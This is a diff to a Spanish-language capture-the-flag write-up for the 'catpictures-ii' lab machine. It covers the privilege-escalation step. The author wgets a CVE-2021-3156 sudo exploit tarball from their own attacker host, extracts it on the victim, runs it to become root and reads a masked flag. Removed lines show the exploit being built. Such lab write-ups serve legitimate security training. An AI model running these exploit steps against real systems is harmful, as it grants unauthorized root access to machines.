@@ -459,25 +459,50 @@ Saving to: ‘main’
 
 2026-08-19 04:20:10 (1.53 MB/s) - ‘main’ saved [4321/4321]
 
-Al intentar descomprimirlo en la máquina víctima, me doy cuenta de que no hay zip, lo descomprimo en la atacante, lo compilo y me lo vuelvo a descargar.
+//Aquí la máquina dejó de responder. Reinicio.
+Al intentar descomprimirlo en la máquina víctima, me doy cuenta de que no hay zip, pruebo con tar. Lo descomprimo y compilo en la víctima, y lo ejecuto.
 
-/scripts/CVE-2021-3156-main$ make
-rm -rf libnss_X
-mkdir libnss_X
-gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
-gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
-
-bismuth@catpictures-ii:~$ wget http://192.168.131.65:8080/sudo-hax-me-a-sandwich
-<t http://192.168.131.65:8080/sudo-hax-me-a-sandwich
---2026-08-19 04:27:34--  http://192.168.131.65:8080/sudo-hax-me-a-sandwich
+bismuth@catpictures-ii:~$ wget http://192.168.131.65:8080/CVE-2021-3156.tar
+wget http://192.168.131.65:8080/CVE-2021-3156.tar
+--2026-08-19 04:43:10--  http://192.168.131.65:8080/CVE-2021-3156.tar
 Connecting to 192.168.131.65:8080... connected.
 HTTP request sent, awaiting response... 200 OK
-Length: 16592 (16K) [application/octet-stream]
-Saving to: ‘sudo-hax-me-a-sandwich’
+Length: 92160 (90K) [application/x-tar]
+Saving to: ‘CVE-2021-3156.tar’
 
-     0K .......... ......                                     100%  454K=0.04s
+     0K .......... .......... .......... .......... .......... 55%  860K 0s
+    50K .......... .......... .......... ..........           100% 1.13M=0.09s
 
-2026-08-19 04:27:34 (454 KB/s) - ‘sudo-hax-me-a-sandwich’ saved [16592/16592]
+2026-08-19 04:43:10 (971 KB/s) - ‘CVE-2021-3156.tar’ saved [92160/92160]
+
+bismuth@catpictures-ii:~$ tar -xvf CVE-2021-3156.tar
+tar -xvf CVE-2021-3156.tar
+./
+./lib.c
+./.git/
+./.git/hooks/
+./.git/hooks/sendemail-validate.sample
+./.git/hooks/pre-push.sample
+./.git/hooks/pre-merge-commit.sample
 
 Y lo ejecuto usando el target correcto.
+
+bismuth@catpictures-ii:~$ ./sudo-hax-me-a-sandwich 0
+./sudo-hax-me-a-sandwich 0
+whoami
+root
+
+Y encuentro la tercera flag en el directorio de /root.
+
+cd /root
+ls
+ansible
+docker-compose.yaml
+flag3.txt
+gitea
+
+cat flag3.txt
+6**********************
+
+
 
